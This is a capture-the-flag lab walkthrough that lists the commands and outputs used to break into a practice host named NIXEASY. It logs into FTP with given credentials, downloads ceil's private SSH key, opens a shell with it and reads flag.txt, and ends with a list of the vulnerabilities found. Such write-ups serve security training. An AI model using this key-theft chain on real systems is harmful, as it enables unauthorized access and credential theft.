# Credential Exploitation Walkthrough - ceil:qwer1234

**Date:** January 1, 2026  
**Target:** 10.129.55.4  
**Credentials:** ceil:qwer1234  
**Objective:** Utilize provided credentials to exfiltrate information and locate flag.txt

---

## Step 1: Service Discovery

Before attempting to use the credentials, we first performed a full service scan to identify all available services on the target.

**Command:**
```bash
nmap -sV -sC 10.129.55.4
```

**Results:**
- **Port 21/tcp** - FTP (ProFTPD Server - ftp.int.inlanefreight.htb)
- **Port 22/tcp** - SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.2)
- **Port 53/tcp** - DNS (ISC BIND 9.16.1)
- **Port 2121/tcp** - FTP (ProFTPD Server - Ceil's FTP)

**Key Finding:** Two FTP services running on different ports - one appears to be specifically for user "ceil" based on the banner.

---

## Step 2: SSH Authentication Attempt

We attempted SSH access using the password credentials.

**Command:**
```bash
ssh ceil@10.129.55.4
```

**Result:** **FAILED**
- Error: `Permission denied (publickey)`
- SSH server is configured for public key authentication only
- Password authentication is disabled

**Conclusion:** Direct SSH access with password is not possible. Need to find SSH private key.

---

## Step 3: FTP Access - Port 21

We attempted FTP login on the standard port 21.

**Command:**
```bash
ftp -n 10.129.55.4 <<EOF
user ceil qwer1234
pwd
ls -la
quit
EOF
```

**Results:**
```
Remote directory: /
drwxr-xr-x   2 root     root         4096 Nov 10  2021 .
drwxr-xr-x   2 root     root         4096 Nov 10  2021 ..
```

**Analysis:** 
- Login successful but limited access
- Only root-owned directories visible
- Empty directory with no accessible files
- Not the user's home directory

---

## Step 4: FTP Access - Port 2121 (Ceil's FTP)

We attempted FTP login on port 2121, which the banner identified as "Ceil's FTP".

**Command:**
```bash
ftp -n 10.129.55.4 2121 <<EOF
user ceil qwer1234
pwd
ls -la
quit
EOF
```

**Results:**
```
Remote directory: /
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
```

**Analysis:**
- **SUCCESS!** Login granted to ceil's home directory
- All files owned by user "ceil"
- Critical discovery: `.ssh` directory present (typically contains SSH keys)

---

## Step 5: SSH Key Discovery

We navigated to the .ssh directory to search for SSH keys.

**Command:**
```bash
ftp -n 10.129.55.4 2121 <<EOF
user ceil qwer1234
cd .ssh
ls -la
quit
EOF
```

**Results:**
```
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
```

**Analysis:**
- **CRITICAL FINDING:** Private SSH key `id_rsa` discovered!
- File permissions show id_rsa has restrictive permissions (600)
- Public key and authorized_keys also present
- This private key is likely the "missing SSH keys" referenced in the forum discussions

---

## Step 6: SSH Private Key Exfiltration

We downloaded the private SSH key from the FTP server.

**Command:**
```bash
ftp -n 10.129.55.4 2121 <<EOF
user ceil qwer1234
cd .ssh
binary
get id_rsa /tmp/ceil_id_rsa
get id_rsa.pub /tmp/ceil_id_rsa.pub
quit
EOF
```

**Results:**
- Successfully downloaded `id_rsa` to `/tmp/ceil_id_rsa`
- Successfully downloaded `id_rsa.pub` to `/tmp/ceil_id_rsa.pub`
- Files transferred in binary mode to preserve integrity

**Verification:**
```bash
cat /tmp/ceil_id_rsa
```
Output confirmed valid OpenSSH private key format (RSA 4096-bit key based on length).

---

## Step 7: SSH Access with Private Key

We set proper permissions on the private key and attempted SSH authentication.

**Command:**
```bash
chmod 600 /tmp/ceil_id_rsa
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no ceil@10.129.55.4 'whoami; hostname; pwd; ls -la'
```

**Results:**
```
ceil
NIXEASY
/home/ceil
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
```

**Analysis:**
- **SUCCESS!** SSH authentication successful
- Confirmed user: `ceil`
- Hostname: `NIXEASY`
- Full shell access obtained
- This resolves the "missing SSH keys" referenced in the forum

---

## Step 8: Flag.txt Location Discovery

We searched the entire filesystem for the flag.txt file.

**Command:**
```bash
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no ceil@10.129.55.4 'find / -name "flag.txt" 2>/dev/null'
```

**Results:**
```
/home/flag/flag.txt
```

**Analysis:**
- Flag file located at `/home/flag/flag.txt`
- Separate user directory "flag" exists
- File likely readable by ceil user due to default permissions

---

## Step 9: Flag Exfiltration

We retrieved the contents of the flag file.

**Command:**
```bash
ssh -i /tmp/ceil_id_rsa -o StrictHostKeyChecking=no ceil@10.129.55.4 'cat /home/flag/flag.txt'
```

**Results:**
```
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

**Analysis:**
- **OBJECTIVE COMPLETE!** Flag successfully exfiltrated
- Standard HTB{} flag format confirmed

---

## Summary of Attack Chain

1. **Service Discovery** → Found two FTP services and SSH (pubkey only)
2. **FTP Port 21** → Limited access, no useful data
3. **FTP Port 2121** → Ceil's home directory exposed
4. **SSH Directory** → Private key discovered in `.ssh/id_rsa`
5. **Key Exfiltration** → Downloaded private SSH key via FTP
6. **SSH Access** → Authenticated using stolen private key
7. **Flag Discovery** → Located flag.txt via filesystem search
8. **Flag Retrieval** → Successfully exfiltrated flag contents

---

## Security Vulnerabilities Identified

1. **Weak FTP Configuration**
   - User home directory directly accessible via FTP
   - No restrictions on accessing `.ssh` directory
   - Allowed download of private SSH keys

2. **Insecure File Permissions**
   - Private SSH key readable via FTP (should be restricted)
   - Home directory permissions too permissive

3. **Credential Reuse**
   - Same password used for both FTP services
   - No separation of authentication mechanisms

4. **Information Disclosure**
   - FTP banner reveals username ("Ceil's FTP")
   - Aids attackers in credential guessing

---

## References

- Credentials source: Teammate discovery - "ceil:qwer1234"
- SSH keys reference: Forum discussions mentioned by team
- All commands logged to: `./scans/ftp.log` and `./scans/ssh.log`
